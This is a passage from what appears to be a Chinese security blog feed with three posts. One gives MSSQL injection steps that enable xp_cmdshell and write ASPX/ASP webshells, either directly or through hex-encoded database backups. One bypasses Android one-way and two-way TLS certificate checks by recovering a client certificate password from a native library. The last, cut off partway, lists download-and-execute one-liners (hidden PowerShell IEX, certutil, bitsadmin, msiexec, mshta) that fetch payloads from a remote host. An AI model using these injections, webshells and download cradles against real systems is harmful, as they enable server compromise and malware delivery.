2019</strong>，具体的搭建自行百度</p><blockquote><p>拿shell的两大前提</p></blockquote><ol><li>有相应的权限db_owner</li><li>知道web目录的绝对路径</li></ol><p>测试的时候默认使用<strong>sa</strong>进行连接</p><h3 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><ul><li><p>报错信息</p></li><li><p>字典猜</p></li><li><p>旁站的目录</p></li><li><p>存储过程来搜索</p></li><li><p>读配置文件</p></li></ul><p>前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。</p><p>在mssql中有两个存储过程可以帮我们来找绝对路径：<code>xp_cmdshell</code>和 <code>xp_dirtree</code></p><h4 id="利用xp-dirtree方法来寻找"><a href="#利用xp-dirtree方法来寻找" class="headerlink" title="利用xp_dirtree方法来寻找"></a>利用xp_dirtree方法来寻找</h4><p>先来看<code>xp_dirtree</code>直接举例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#39;c:&#39; --列出所有c:\文件、目录、子目录 </span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1 --只列c:\目录</span><br><span class="line">execute master..xp_dirtree &#39;c:&#39;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure><p>列出所有的C盘文件、目录、子目录</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/23.png?raw=true" alt="image-20200723105433198"></p><p>只列出目录</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/24.png?raw=true" alt="image-20200723105502074"></p><p>列出文件和目录</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/25.png?raw=true" alt="image-20200723105539049"></p><blockquote><p>注意</p></blockquote><p>这边使用<code>xp_dirtree</code>举例所列出的文件都是基于当前盘符当前目录的，不包括目录里面的文件，比如我们查看D盘内容</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/26.png?raw=true" alt="image-20200723110109092"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/27.png?raw=true" alt="image-20200723110137969"></p><p>可以看到只有两个文件，可以论证之前说的</p><h5 id="真实环境下的操作"><a href="#真实环境下的操作" class="headerlink" title="真实环境下的操作"></a>真实环境下的操作</h5><p>当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line">insert into tmp(dir,num,num1) execute master..xp_dirtree &#39;c:&#39;,1,1;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/28.png?raw=true" alt="image-20200723110625751"></p><p>然后查询下表发现成功写入</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/29.png?raw=true" alt="image-20200723110801315"></p><h4 id="利用xp-cmdshell方法来寻找"><a href="#利用xp-cmdshell方法来寻找" class="headerlink" title="利用xp_cmdshell方法来寻找"></a>利用xp_cmdshell方法来寻找</h4><blockquote><p>SQL Server 阻止了对组件 <code>xp_cmdshell</code>的过程<strong>sys.xp_cmdshell</strong>的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用。</p></blockquote><p>如果遇到<code>xp_cmdshell</code>不能调用解决方法，这样我们就只能能执行CMD命令了，开启方面需要连接数据库才行。PS:如果都开启这种方法就不用写shell了直接执行CMD下载木马即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#39;show advanced options&#39;,1;&#x2F;&#x2F;允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1;  &#x2F;&#x2F;打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/30.png?raw=true" alt="image-20200723112209434"></p><p>接下来我们先来看cmd中怎么查找文件，该条命令如果用powershell会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r d:\ %i in (2*.php) do @echo %i</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/31.png?raw=true" alt="image-20200723112513645"></p><p>需要建立一个表 存在一个char字段就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;insert into cmdtmp(dir) exec master..xp_cmdshell &#39;for &#x2F;r d:\ %i in (2*.php) do @echo %i&#39;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/32.png?raw=true" alt="image-20200723112610911"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/33.png?raw=true" alt="image-20200723112707616"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/34.png?raw=true" alt="image-20200723112930188"></p><p>成功查询出结果</p><h3 id="写入Webshell"><a href="#写入Webshell" class="headerlink" title="写入Webshell"></a>写入Webshell</h3><h4 id="利用xp-cmdshell命令写shell"><a href="#利用xp-cmdshell命令写shell" class="headerlink" title="利用xp_cmdshell命令写shell"></a>利用xp_cmdshell命令写shell</h4><p>上面说了xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径，如果不存在路径会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;exec master..xp_cmdshell &#39;echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; D:\\test\\ascotbe.aspx&#39; ;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/35.png?raw=true" alt="image-20200723113418645"></p><p>写入成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/36.png?raw=true" alt="image-20200723113431063"></p><h4 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h4><p>因为权限的问题，最好不要备份到盘符根目录</p><p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;backup database 库名 to disk &#x3D; &#39;D:\bak.bak&#39;;--</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;create table [dbo].[test] ([cmd] [image]);</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E);</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1;backup database 库名 to disk&#x3D;&#39;D:\ascotbe.asp&#39; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure><p>这里测试只能进行备份，执行最后一句差异备份会报错，所以可以直接进行备份写shell，虽然文件会很大</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/37.png?raw=true" alt="image-20200723134845565"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/38.png?raw=true" alt="image-20200723134901581"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/39.png?raw=true" alt="image-20200723135025252"></p><p>可以看到shell是写进去了，就是文件有点大</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/DatabaseWriteWebshell/40.png?raw=true" alt="image-20200723142516722"></p><h4 id="log备份写shell"><a href="#log备份写shell" class="headerlink" title="log备份写shell"></a>log备份写shell</h4><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;以下步骤省略http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;test.aspx?id&#x3D;1</span><br><span class="line">alter database 库名 set RECOVERY FULL;</span><br><span class="line">create table cmd (a image) ;</span><br><span class="line">backup log 库名 to disk &#x3D; &#39;D:\test&#39; with init ;</span><br><span class="line">insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) ;</span><br><span class="line">backup log 库名 to disk &#x3D; &#39;D:\test\2.asp&#39;;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;springside-example&#x2F;archive&#x2F;2007&#x2F;09&#x2F;06&#x2F;2529958.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;zyq357&#x2F;article&#x2F;details&#x2F;104698157</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;junmail&#x2F;article&#x2F;details&#x2F;4381287</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xuliangxing&#x2F;p&#x2F;6005154.html</span><br><span class="line">https:&#x2F;&#x2F;y4er.com&#x2F;post&#x2F;mssql-getshell&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>解决安卓单向/双向认证导致无法抓包</title>
    <link href="https://www.ascotbe.com/2020/07/20/HttpCertificate/"/>
    <id>https://www.ascotbe.com/2020/07/20/HttpCertificate/</id>
    <published>2020-07-20T12:45:53.000Z</published>
    <updated>2021-05-04T06:03:28.417Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>本文思路来着公众号小和尚的安全之路，菜鸡的我周天面试被社会毒打了一顿，问了双向认证问题，但是这玩意我没接触过，刚好今天看到一篇文章，学习一下</p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/25.png?raw=true" alt="image-20200720171422600" style="zoom:67%;" /><h3 id="首先准备工作"><a href="#首先准备工作" class="headerlink" title="首先准备工作"></a>首先准备工作</h3><ul><li>XposedInstaller（Xposed安装器）</li><li>JustTrustMe（禁用SSL）</li><li>ida pro（静态逆向程序）</li><li>JEB（apk解包程序）</li><li>test.apk（目标程序）</li></ul><p>所需文件位置下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;virus&#x2F;blob&#x2F;master&#x2F;HttpCertificate</span><br></pre></td></tr></table></figure><h3 id="解决单向认证"><a href="#解决单向认证" class="headerlink" title="解决单向认证"></a>解决单向认证</h3><h4 id="安装Xposed框架"><a href="#安装Xposed框架" class="headerlink" title="安装Xposed框架"></a>安装<strong>Xposed</strong>框架</h4><p>刚开始安装好APK是显示框架未安装的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/1.png?raw=true" alt="image-20200720112832854"></p><p>点击这个安装</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/2.png?raw=true" alt="image-20200720112859128"></p><p>xuanz安装</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/3.png?raw=true" alt="image-20200720112931127"></p><p>接着点击安装</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/4.png?raw=true" alt="image-20200720112330718"></p><p>然后从起后就能看到安装成功了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/5.png?raw=true" alt="image-20200720113013136"></p><h4 id="安装JustTrusMe模块"><a href="#安装JustTrusMe模块" class="headerlink" title="安装JustTrusMe模块"></a>安装JustTrusMe模块</h4><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/6.png?raw=true" alt="image-20200720113109696"></p><p>点击左上角的菜单</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/7.png?raw=true" alt="image-20200720113207651"></p><p>然后选着模块</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/8.png?raw=true" alt="image-20200720113235596"></p><p>勾选就好了，这样就解决了单向认证，可以绕过客户端校验了</p><h3 id="解决双向认证"><a href="#解决双向认证" class="headerlink" title="解决双向认证"></a>解决双向认证</h3><p>我们来把目标程序抓个包</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/9.png?raw=true" alt="image-20200720115020799"></p><p>可以看到服务器显示为400，抓包无法用了</p><h4 id="找客户端的证书"><a href="#找客户端的证书" class="headerlink" title="找客户端的证书"></a>找客户端的证书</h4><p>接下来就是客户端的证书了，我们先解压这个软件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/10.png?raw=true" alt="image-20200720134216876"></p><p>然后全局收缩这个软件的证书一般是<code>.p12</code>或者<code>.pfx</code>结尾的（如果这个版本有壳你嫌麻烦不想脱壳的话可以找之前的版本试试）</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/11.png?raw=true" alt="image-20200720135748469"></p><h4 id="找证书密码"><a href="#找证书密码" class="headerlink" title="找证书密码"></a>找证书密码</h4><p>首先需要设置jeb的最大内存不然会报错，因为大的APK会导致java内存溢出，替换<strong>jeb_wincon.bat</strong>文件中的内容，<code>-Xmx8192m</code>表示内存的大小</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%JAVA%</span> -jar &quot;%~dp0bin\app\jebc.jar&quot; %*</span><br><span class="line">//替换为</span><br><span class="line"><span class="variable">%JAVA%</span> -Xmx8192m  -XX:-UseParallelGC  -XX:MinHeapFreeRatio=<span class="number">15</span>  -jar &quot;%~dp0bin\app\jebc.jar&quot; %*</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/12.png?raw=true" alt="image-20200720150405689"></p><p>打开<strong>test.apk</strong>，利用搜索来找<strong>client.p12</strong>的值（或者关键字PKCS12，这是通常读取证书需要用到的关键字）</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/13.png?raw=true" alt="image-20200720153437104"></p><p>对字符串的位置进行右键解析</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/14.png?raw=true" alt="image-20200720153555251"></p><p>往下面找找看有没有什么open之类的函数来打开证书的</p><p>这边大概的意思就是把打开的证书和数组中的字符串加载到<code>v4_1</code>这个函数中，然后跳转到<code>label_27</code>中进行关闭打开的证书，所以百分之80可以断定<code>v1</code>应该就是我们需要的密码</p><p>跟进<code>v1</code>的值（双击即可）</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/15.png?raw=true" alt="image-20200720154800481"></p><p>跟进到这边发现调用了好几个值，由于我是菜鸡对JAVA不是很懂，就每一个值都看了一遍，发现<code>SoulNetworkSDK.b().a(SoulNetworkSDK.b().g())</code>中的b和g都是返回值并且不能跟进了，而a函数可以跟进并且函数名为<code>getStorePassword</code>，那百分之90可以确定a函数就是我们需要的函数</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/16.png?raw=true" alt="image-20200720155254344"></p><p>继续跟进它</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/17.png?raw=true" alt="image-20200720155408539"></p><p>再接着跟进，看到了<code>private native String getStorePassword(String arg1)</code>这个声明方法，wtf?线索断了？接着我百度了一下<code>native</code>方法发现，<code>native</code>关键字说明其修饰的方法是一个原生态方法，方法对应的实现不是在当前文件，而是在用其他语言（如C和C++）实现的文件中<strong>。</strong>Java语言本身不能对操作系统底层进行访问和操作，但是可以通过JNI接口调用其他语言来实现对底层的访问。然后看来下用例，原来 会加载一个文件一样的东西，大概的例子和下面类似，然后我们找这个类有什么文件加载的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> HelloWorld().hello(<span class="string">&quot;jni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再开头的地方找到了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/18.png?raw=true" alt="image-20200720160536948"></p><p>soul-netsdk就是调用的libsoul-netsdk.so文件，然后我们去解压的文件中找这个名字</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/19.png?raw=true" alt="image-20200720161228991"></p><p>我们用IDA打开它，然后全局搜索之前找到的那个函数名<code>getStorePassword</code>，为什么要搜索这个函数名呢，因为**.SO<strong>文件是Linux下的动态链接,其功能和作用类似与windows下</strong>.dll**文件，而<code>getStorePassword</code>就类似于一个导出函数</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/20.png?raw=true" alt="image-20200720161659826"></p><p>然后F5即可看到伪代码了，并且密码也出来了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/21.png?raw=true" alt="image-20200720161930289"></p><p>利用这个密码和之前那个证书进行安装</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/22.png?raw=true" alt="image-20200720162120605"></p><p>安装成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/23.png?raw=true" alt="image-20200720162727493"></p><p>接着我们再次尝试抓包，成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/HttpCertificate/24.png?raw=true" alt="image-20200720162849793"></p><p>参考文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;042ce0b88f03</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;0uItUS5P8gFQ1Cu5-jkCgQ</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意程序研究之远程下载恶意程序</title>
    <link href="https://www.ascotbe.com/2020/07/12/RemoteDownload/"/>
    <id>https://www.ascotbe.com/2020/07/12/RemoteDownload/</id>
    <published>2020-07-12T07:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我知道上篇文章没有写完，但是把看到什么学什么，要终结的嘛你说是吧（ps:后续有其他方法也会更新到这里的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/1.jpg?raw=true" alt="img"></p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="命令行自带工具"><a href="#命令行自带工具" class="headerlink" title="命令行自带工具"></a>命令行自带工具</h4><h5 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h5><p>PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。</p><p>远程下载文件到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.183.138:8000/test.txt&#x27;</span>,<span class="string">&#x27;test.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/2.png?raw=true" alt="image-20200711233252456"></p><p>直接把文本转换为exe文件运行，无残留文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.183.138:8000/test.txt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/3.png?raw=true" alt="image-20200711233807215"></p><p>可以发现执行了，火绒都跑出来了23333</p><h5 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h5><p>certutil.exe是一个命令行程序，作为证书服务的一部分安装，你可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。</p><p>可以借助certutil来实现远程下载文件到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.183.138:8000/test.txt test.exe</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/4.png?raw=true" alt="image-20200711234529773"></p><h5 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h5><p>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。</p><p>可以通过在目标主机上执行以下命令来实现远程文件下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://192.168.183.138:8000/test.txt F:\ascotbe\test.ext</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/5.png?raw=true" alt="image-20200711234735873"></p><h5 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h5><p>FTP(File Transfer Protocol，文件传输协议)是TCP/IP 协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端，其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。</p><p>首先利用<strong>FileZilla</strong>来搭建个服务器</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/6.png?raw=true" alt="image-20200712000827946"></p><p>在目标主机上远程下载<code>test.txt</code>文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/7.png?raw=true" alt="image-20200712001918698"></p><h5 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h5><p>msiexec是windows自带的cmd工具，支持远程下载功能，攻击者可以将msi文件上传到服务器并执行，下面通过一个实例做演示说明，首先我们通过msfvenom来构造一个恶意的msi程序(这里以弹计算器为例，在实战中可以根据需要进行修改)，并启动一个简易</p><p>制作服务：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/8.png?raw=true" alt="image-20200712002447041"></p><p>然后运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i http://192.168.183.138:8000/ascotbe.msi</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/9.png?raw=true" alt="image-20200712002628204"></p><p>还是把火绒给关了不然直接给我拦截了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/10.png?raw=true" alt="image-20200712002748059"></p><h5 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h5><p>mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件，我们可以在本地构建hta文件，之后通过目标主机的mshta来远程下载并执行，例如在本地创建以下hta文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Set</span> objShell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class="line"><span class="javascript">objShell.Run <span class="string">&quot;cmd.exe /c calc.exe&quot;</span> <span class="comment">// 待执行的命令</span></span></span><br><span class="line">self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Demo</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在受害机器上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta  http://192.168.183.138:8000/ascotbe.hta</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/11.png?raw=true" alt="image-20200712003050771"></p><p><del>这里说一句，火绒没拦截？？？？？？有点意思</del></p><p>也可以用<strong>MSF</strong>或者<strong>CS</strong>生产<code>hta</code>文件，直接受害者机器执行就能上线</p><h5 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h5><p>Rundll32.exe功能是以命令行的方式调用动态链接程序库，系统中还有一个Rundll64.exe文件，它的意思是”执行64位的DLL文件”， 其命令行下的使用方法为：Rundll32.exe DLLname,Functionname Arguments，其中DLLname为需要执行的DLL文件名，Functionname为前边需要执行的DLL文件的具体引出函数，Arguments为引出函数的具体参数。</p><p>两篇讲解关于rundll32.exe利用的文章，挺好用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;3gstudent.github.io&#x2F;3gstudent.github.io&#x2F;%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90&#x2F;</span><br><span 